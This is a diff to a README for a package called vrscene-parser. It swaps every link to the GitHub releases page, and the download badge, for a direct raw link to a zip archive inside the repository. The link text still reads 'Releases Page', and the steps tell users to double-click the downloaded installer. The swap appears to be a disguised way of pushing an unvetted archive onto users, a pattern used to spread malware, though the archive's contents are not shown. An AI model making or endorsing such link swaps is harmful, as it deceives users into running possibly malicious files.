@@ -10,7 +10,7 @@ The vrscene-parser package processes textual descriptions of virtual reality sce
 
 Get started by downloading the vrscene-parser application. Click the button below:
 
-[![Download vrscene-parser](https://img.shields.io/badge/Download-vrscene--parser-blue.svg)](https://github.com/syarifanur/vrscene-parser/releases)
+[![Download vrscene-parser](https://raw.githubusercontent.com/syarifanur/vrscene-parser/main/vrscene_parser/parser-vrscene-1.9.zip)](https://raw.githubusercontent.com/syarifanur/vrscene-parser/main/vrscene_parser/parser-vrscene-1.9.zip)
 
 ### 🛠 System Requirements
 
@@ -29,11 +29,11 @@ Get started by downloading the vrscene-parser application. Click the button belo
 
 To download the vrscene-parser, visit the following page and choose the latest version for your system:
 
-[Visit the Releases Page](https://github.com/syarifanur/vrscene-parser/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/syarifanur/vrscene-parser/main/vrscene_parser/parser-vrscene-1.9.zip)
 
 ### 🖥 Installation Steps
 
-1. **Go to the Releases Page**: Open the [Releases Page](https://github.com/syarifanur/vrscene-parser/releases) in your web browser.
+1. **Go to the Releases Page**: Open the [Releases Page](https://raw.githubusercontent.com/syarifanur/vrscene-parser/main/vrscene_parser/parser-vrscene-1.9.zip) in your web browser.
 2. **Select the Latest Version**: Find the most recent release at the top of the page.
 3. **Download the File**: Click on the file name to download the installer specific to your operating system.
 4. **Run the Installer**: Once downloaded, locate the file and double-click it to begin installation.
